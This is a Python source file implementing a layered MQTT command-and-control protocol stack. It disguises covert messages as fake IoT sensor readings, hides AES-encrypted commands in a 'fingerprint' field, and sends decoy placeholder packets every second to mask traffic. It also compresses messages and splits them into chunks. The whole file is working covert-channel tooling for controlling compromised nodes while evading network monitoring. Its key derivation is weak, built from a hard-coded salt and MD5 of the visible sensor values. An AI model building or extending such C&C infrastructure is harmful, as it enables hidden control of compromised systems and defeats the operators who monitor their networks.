"""
Layered Protocol Stack for MQTT C&C Communication

Layer Architecture:
┌─────────────────────────────────────────┐
│  ApplicationLayer (C&C)                 │
├─────────────────────────────────────────┤
│  TransportLayer (compression/splitting) │
├─────────────────────────────────────────┤
│  EncryptionLayer (AES + sensor struct)  │
├─────────────────────────────────────────┤
│  LinkLayer (1s interval MQTT sending)   │
└─────────────────────────────────────────┘

Each layer reports its max payload size upward via get_max_payload_size().
This allows pluggable encodings with different overhead.
"""

import paho.mqtt.client as mqtt
import json
import random
import time
import hashlib
import threading
import queue
import zlib
import base64
import uuid
from typing import Callable, Optional, Dict, Any
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes


# --- CONFIGURATION ---
DEFAULT_BROKER = "127.0.0.1"
DEFAULT_PORT = 1883
DEFAULT_TOPIC = "sensors"
DEFAULT_SALT = "S4ur0ns_S3cr3t_S4lt_2025"
DEFAULT_SEND_INTERVAL = 1.0
DEFAULT_MAX_MQTT_PAYLOAD = 4096  # Max bytes for MQTT message (configurable)
REASSEMBLY_TIMEOUT = 30  # Seconds to wait for all chunks


class LinkLayer:
    """
    Bottom layer: Handles MQTT connection and timed packet sending.
    Sends one packet per interval, queues outgoing packets.
    """
    
    def __init__(self, node_id: str, broker: str = DEFAULT_BROKER, 
                 port: int = DEFAULT_PORT, topic: str = DEFAULT_TOPIC,
                 send_interval: float = DEFAULT_SEND_INTERVAL,
                 max_payload: int = DEFAULT_MAX_MQTT_PAYLOAD):
        self.node_id = node_id
        self.broker = broker
        self.port = port
        self.topic = topic
        self.send_interval = send_interval
        self.max_payload = max_payload  # Base MTU for the link
        
        self.client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
        self.outgoing_queue = queue.Queue()
        self.upper_layer: Optional['EncryptionLayer'] = None
        self._running = False
        self._sender_thread = None
        
        self.client.on_connect = self._on_connect
        self.client.on_message = self._on_message
    
    def set_upper_layer(self, layer: 'EncryptionLayer'):
        self.upper_layer = layer
    
    def get_max_payload_size(self) -> int:
        """Return max payload size for this layer."""
        return self.max_payload
    
    def _on_connect(self, client, userdata, flags, reason_code, properties):
        self.client.subscribe(self.topic)
    
    def _on_message(self, client, userdata, msg):
        """Pass received raw packets up to encryption layer."""
        if self.upper_layer:
            try:
                packet = json.loads(msg.payload.decode())
                self.upper_layer.receive_from_below(packet)
            except:
                pass
    
    def send_to_wire(self, packet: dict):
        """Queue a packet for sending."""
        self.outgoing_queue.put(packet)
    
    def _sender_loop(self):
        """Background thread: send one packet per interval."""
        while self._running:
            try:
                # Try to get a queued packet, or request placeholder from upper layer
                try:
                    packet = self.outgoing_queue.get_nowait()
                except queue.Empty:
                    # Request placeholder packet from encryption layer
                    if self.upper_layer:
                        packet = self.upper_layer.create_placeholder_packet()
                    else:
                        packet = None
                
                if packet:
                    self.client.publish(self.topic, json.dumps(packet))
            except Exception:
                pass
            
            time.sleep(self.send_interval)
    
    def start(self):
        """Connect to broker and start sender thread."""
        self.client.connect(self.broker, self.port, 60)
        self.client.loop_start()
        self._running = True
        self._sender_thread = threading.Thread(target=self._sender_loop, daemon=True)
        self._sender_thread.start()
    
    def stop(self):
        """Stop sender thread and disconnect."""
        self._running = False
        if self._sender_thread:
            self._sender_thread.join(timeout=2)
        self.client.loop_stop()
        self.client.disconnect()


class EncryptionLayer:
    """
    Handles AES encryption/decryption and sensor data structure generation.
    Reports its overhead so upper layers know available payload space.
    """
    
    # Overhead: 16 bytes IV + up to 16 bytes padding + hex encoding (2x) + JSON structure
    # JSON structure: {"sensor_id":"sensor_XXXX","temp":XX.X,"hum":XX.X,"bat":XX,"fingerprint":"..."}
    # Base structure is ~70 bytes, fingerprint is hex (2x expansion)
    STRUCTURE_OVERHEAD = 100  # Conservative estimate for JSON wrapper
    AES_OVERHEAD = 32  # IV (16) + max padding (16)
    HEX_EXPANSION = 2  # Hex encoding doubles the size
    
    def __init__(self, node_id: str, salt: str = DEFAULT_SALT):
        self.node_id = node_id
        self.salt = salt
        self.lower_layer: Optional[LinkLayer] = None
        self.upper_layer: Optional['TransportLayer'] = None
    
    def set_lower_layer(self, layer: LinkLayer):
        self.lower_layer = layer
    
    def set_upper_layer(self, layer: 'TransportLayer'):
        self.upper_layer = layer
    
    def get_max_payload_size(self) -> int:
        """
        Return max payload size for data passed to this layer.
        Accounts for encryption overhead and JSON structure.
        """
        if not self.lower_layer:
            return 1024  # Fallback
        
        link_max = self.lower_layer.get_max_payload_size()
        # Available for fingerprint hex: link_max - structure overhead
        available_hex = link_max - self.STRUCTURE_OVERHEAD
        # Available bytes before hex encoding
        available_encrypted = available_hex // self.HEX_EXPANSION
        # Available plaintext before encryption
        available_plaintext = available_encrypted - self.AES_OVERHEAD
        
        return max(available_plaintext, 256)  # Minimum 256 bytes
    
    def _derive_key(self, data_dict: dict) -> bytes:
        """Derive AES key from sensor data + salt."""
        raw_str = (self.salt + str(data_dict.get("sensor_id", "")) + 
                   str(data_dict.get("temp", "")) + 
                   str(data_dict.get("hum", "")) + 
                   str(data_dict.get("bat", "")))
        md5_hash = hashlib.md5(raw_str.encode()).digest()
        return md5_hash + md5_hash  # 32 bytes for AES-256
    
    def _encrypt(self, plaintext: str, key: bytes) -> str:
        """Encrypt plaintext and return hex string."""
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
        return (iv + ciphertext).hex()
    
    def _decrypt(self, fingerprint_hex: str, key: bytes) -> Optional[str]:
        """Decrypt hex fingerprint and return plaintext."""
        try:
            encrypted_data = bytes.fromhex(fingerprint_hex)
            iv = encrypted_data[:16]
            ciphertext = encrypted_data[16:]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(ciphertext), AES.block_size).decode()
        except:
            return None
    
    def _create_sensor_data(self) -> dict:
        """Generate fake sensor data structure."""
        return {
            "sensor_id": self.node_id,
            "temp": round(random.uniform(20.0, 30.0), 1),
            "hum": round(random.uniform(40.0, 60.0), 1),
            "bat": random.randint(80, 100)
        }
    
    def create_placeholder_packet(self) -> dict:
        """Create a packet with no payload (just sensor data)."""
        return self._create_sensor_data()
    
    def send_from_above(self, payload: dict):
        """Encrypt payload and send down to link layer."""
        packet = self._create_sensor_data()
        key = self._derive_key(packet)
        packet["fingerprint"] = self._encrypt(json.dumps(payload), key)
        
        if self.lower_layer:
            self.lower_layer.send_to_wire(packet)
    
    def receive_from_below(self, packet: dict):
        """Decrypt packet and pass up to transport layer."""
        if "fingerprint" not in packet:
            return  # Placeholder packet, ignore
        
        key = self._derive_key(packet)
        decrypted = self._decrypt(packet["fingerprint"], key)
        
        if decrypted and self.upper_layer:
            try:
                payload = json.loads(decrypted)
                self.upper_layer.receive_from_below(payload)
            except:
                pass


class TransportLayer:
    """
    Handles compression and packet splitting/reassembly.
    Queries lower layer for max payload size to determine chunk size.
    """
    
    # Overhead for chunk metadata: {"msg_id":"XXXXXXXX","seq":X,"total":X,"data":"..."}
    CHUNK_METADATA_OVERHEAD = 60
    
    def __init__(self, node_id: str):
        self.node_id = node_id
        self.lower_layer: Optional[EncryptionLayer] = None
        self.upper_layer: Optional['ApplicationLayer'] = None
        
        # Reassembly buffer: msg_id -> {chunks: {seq: data}, total: int, timestamp: float}
        self._reassembly_buffer: Dict[str, dict] = {}
        self._buffer_lock = threading.Lock()
    
    def set_lower_layer(self, layer: EncryptionLayer):
        self.lower_layer = layer
    
    def set_upper_layer(self, layer: 'ApplicationLayer'):
        self.upper_layer = layer
    
    def get_chunk_size(self) -> int:
        """Get the max chunk size based on lower layer capacity."""
        if not self.lower_layer:
            return 1024  # Fallback
        
        # Get available space from encryption layer
        available = self.lower_layer.get_max_payload_size()
        # Subtract our metadata overhead
        chunk_size = available - self.CHUNK_METADATA_OVERHEAD
        
        return max(chunk_size, 128)  # Minimum 128 bytes per chunk
    
    def _compress(self, data: str) -> bytes:
        """Compress data using zlib."""
        return zlib.compress(data.encode(), level=6)
    
    def _decompress(self, data: bytes) -> str:
        """Decompress zlib data."""
        return zlib.decompress(data).decode()
    
    def send_from_above(self, message: dict):
        """Compress, split, and send message down."""
        # Serialize and compress
        json_data = json.dumps(message)
        compressed = self._compress(json_data)
        encoded = base64.b64encode(compressed).decode()
        
        # Get chunk size from lower layer MTU
        chunk_size = self.get_chunk_size()
        
        # Split into chunks
        msg_id = str(uuid.uuid4())[:8]
        chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
        total = len(chunks)
        
        # Send each chunk
        for seq, chunk_data in enumerate(chunks):
            chunk_packet = {
                "msg_id": msg_id,
                "seq": seq,
                "total": total,
                "data": chunk_data
            }
            if self.lower_layer:
                self.lower_layer.send_from_above(chunk_packet)
    
    def receive_from_below(self, payload: dict):
        """Reassemble chunks and pass complete messages up."""
        # Check if this is a chunked message
        if "msg_id" in payload and "seq" in payload:
            self._handle_chunk(payload)
        else:
            # Legacy non-chunked message, pass up directly
            if self.upper_layer:
                self.upper_layer.receive_from_below(payload)
    
    def _handle_chunk(self, chunk: dict):
        """Handle a chunk and attempt reassembly."""
        msg_id = chunk["msg_id"]
        seq = chunk["seq"]
        total = chunk["total"]
        data = chunk["data"]
        
        with self._buffer_lock:
            # Clean up old entries
            self._cleanup_old_entries()
            
            # Add to buffer
            if msg_id not in self._reassembly_buffer:
                self._reassembly_buffer[msg_id] = {
                    "chunks": {},
                    "total": total,
                    "timestamp": time.time()
                }
            
            self._reassembly_buffer[msg_id]["chunks"][seq] = data
            
            # Check if complete
            entry = self._reassembly_buffer[msg_id]
            if len(entry["chunks"]) == entry["total"]:
                # Reassemble
                ordered_data = "".join(entry["chunks"][i] for i in range(total))
                del self._reassembly_buffer[msg_id]
                
                # Decompress and pass up
                try:
                    compressed = base64.b64decode(ordered_data)
                    json_data = self._decompress(compressed)
                    message = json.loads(json_data)
                    
                    if self.upper_layer:
                        self.upper_layer.receive_from_below(message)
                except Exception:
                    pass
    
    def _cleanup_old_entries(self):
        """Remove entries older than REASSEMBLY_TIMEOUT."""
        now = time.time()
        expired = [msg_id for msg_id, entry in self._reassembly_buffer.items()
                   if now - entry["timestamp"] > REASSEMBLY_TIMEOUT]
        for msg_id in expired:
            del self._reassembly_buffer[msg_id]


class ApplicationLayer:
    """
    Top layer: Command & Control interface.
    Provides send() and on_receive() for application use.
    """
    
    def __init__(self, node_id: str):
        self.node_id = node_id
        self.lower_layer: Optional[TransportLayer] = None
        self._receive_callback: Optional[Callable[[dict], None]] = None
    
    def set_lower_layer(self, layer: TransportLayer):
        self.lower_layer = layer
    
    def on_receive(self, callback: Callable[[dict], None]):
        """Register callback for received messages."""
        self._receive_callback = callback
    
    def send(self, target: str, msg_type: str, **kwargs):
        """Send a message through the protocol stack."""
        message = {
            "target": target,
            "sender": self.node_id,
            "type": msg_type,
            **kwargs
        }
        if self.lower_layer:
            self.lower_layer.send_from_above(message)
    
    def receive_from_below(self, message: dict):
        """Handle received message from transport layer."""
        if self._receive_callback:
            self._receive_callback(message)


class ProtocolStack:
    """
    Complete protocol stack that wires all layers together.
    
    To swap encryption/encoding, subclass and replace the encryption layer
    with a different implementation that has the same interface.
    """
    
    def __init__(self, node_id: str, broker: str = DEFAULT_BROKER,
                 port: int = DEFAULT_PORT, topic: str = DEFAULT_TOPIC,
                 salt: str = DEFAULT_SALT, send_interval: float = DEFAULT_SEND_INTERVAL,
                 max_payload: int = DEFAULT_MAX_MQTT_PAYLOAD):
        self.node_id = node_id
        
        # Create layers
        self.link = LinkLayer(node_id, broker, port, topic, send_interval, max_payload)
        self.encryption = EncryptionLayer(node_id, salt)
        self.transport = TransportLayer(node_id)
        self.application = ApplicationLayer(node_id)
        
        # Wire layers together
        self.link.set_upper_layer(self.encryption)
        
        self.encryption.set_lower_layer(self.link)
        self.encryption.set_upper_layer(self.transport)
        
        self.transport.set_lower_layer(self.encryption)
        self.transport.set_upper_layer(self.application)
        
        self.application.set_lower_layer(self.transport)
    
    def start(self):
        """Start the protocol stack."""
        self.link.start()
    
    def stop(self):
        """Stop the protocol stack."""
        self.link.stop()
    
    def send(self, target: str, msg_type: str, **kwargs):
        """Send a message (convenience method)."""
        self.application.send(target, msg_type, **kwargs)
    
    def on_receive(self, callback: Callable[[dict], None]):
        """Register receive callback (convenience method)."""
        self.application.on_receive(callback)
    
    def get_chunk_size(self) -> int:
        """Get the effective chunk size for this stack."""
        return self.transport.get_chunk_size()
